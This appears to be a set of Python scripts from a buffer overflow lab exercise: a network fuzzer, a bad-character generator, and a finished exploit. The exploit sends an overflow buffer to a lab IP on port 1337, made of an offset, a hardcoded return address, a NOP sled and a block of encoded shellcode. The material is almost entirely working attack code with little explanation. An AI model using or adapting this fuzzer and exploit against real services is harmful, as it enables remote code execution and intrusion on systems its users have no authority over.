Fuzzer.py

#!/usr/bin/env python3

import socket, time, sys

ip = ""
#put box you are attacking IP here

port = 
#put box you are attacking port here

timeout = 5
prefix = "OVERFLOW1 "
#change prefix if needed, some need this others do not

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  
  *******************************************************************************************************************************
  
  bad_chars.py
  
  for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()  
  
  
  \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
  
  *********************************************************************************************************************************
  
  exploit.py
  
  import socket

ip = "10.10.154.169"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
#0x625011af
padding = "\x90"*16
payload = ("\xb8\x9b\x57\x50\xd9\xd9\xea\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\xd8\x59\xb2\x2c\x22\x8d\xb0"
"\xcf\xda\x4e\xd5\x46\x3f\x7f\xd5\x3d\x34\xd0\xe5\x36\x18\xdd"
"\x8e\x1b\x88\x56\xe2\xb3\xbf\xdf\x49\xe2\x8e\xe0\xe2\xd6\x91"
"\x62\xf9\x0a\x71\x5a\x32\x5f\x70\x9b\x2f\x92\x20\x74\x3b\x01"
"\xd4\xf1\x71\x9a\x5f\x49\x97\x9a\xbc\x1a\x96\x8b\x13\x10\xc1"
"\x0b\x92\xf5\x79\x02\x8c\x1a\x47\xdc\x27\xe8\x33\xdf\xe1\x20"
"\xbb\x4c\xcc\x8c\x4e\x8c\x09\x2a\xb1\xfb\x63\x48\x4c\xfc\xb0"
"\x32\x8a\x89\x22\x94\x59\x29\x8e\x24\x8d\xac\x45\x2a\x7a\xba"
"\x01\x2f\x7d\x6f\x3a\x4b\xf6\x8e\xec\xdd\x4c\xb5\x28\x85\x17"
"\xd4\x69\x63\xf9\xe9\x69\xcc\xa6\x4f\xe2\xe1\xb3\xfd\xa9\x6d"
"\x77\xcc\x51\x6e\x1f\x47\x22\x5c\x80\xf3\xac\xec\x49\xda\x2b"
"\x12\x60\x9a\xa3\xed\x8b\xdb\xea\x29\xdf\x8b\x84\x98\x60\x40"
"\x54\x24\xb5\xc7\x04\x8a\x66\xa8\xf4\x6a\xd7\x40\x1e\x65\x08"
"\x70\x21\xaf\x21\x1b\xd8\x38\x44\xd5\xea\x1e\x30\xe7\xea\x5b"
"\xfb\x6e\x0c\x09\xeb\x26\x87\xa6\x92\x62\x53\x56\x5a\xb9\x1e"
"\x58\xd0\x4e\xdf\x17\x11\x3a\xf3\xc0\xd1\x71\xa9\x47\xed\xaf"
"\xc5\x04\x7c\x34\x15\x42\x9d\xe3\x42\x03\x53\xfa\x06\xb9\xca"
"\x54\x34\x40\x8a\x9f\xfc\x9f\x6f\x21\xfd\x52\xcb\x05\xed\xaa"
"\xd4\x01\x59\x63\x83\xdf\x37\xc5\x7d\xae\xe1\x9f\xd2\x78\x65"
"\x59\x19\xbb\xf3\x66\x74\x4d\x1b\xd6\x21\x08\x24\xd7\xa5\x9c"
"\x5d\x05\x56\x62\xb4\x8d\x76\x81\x1c\xf8\x1e\x1c\xf5\x41\x43"
"\x9f\x20\x85\x7a\x1c\xc0\x76\x79\x3c\xa1\x73\xc5\xfa\x5a\x0e"
"\x56\x6f\x5c\xbd\x57\xba")
#bad chars \x00 \xa0 \x07 \x2e
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")   
  
  
  
  
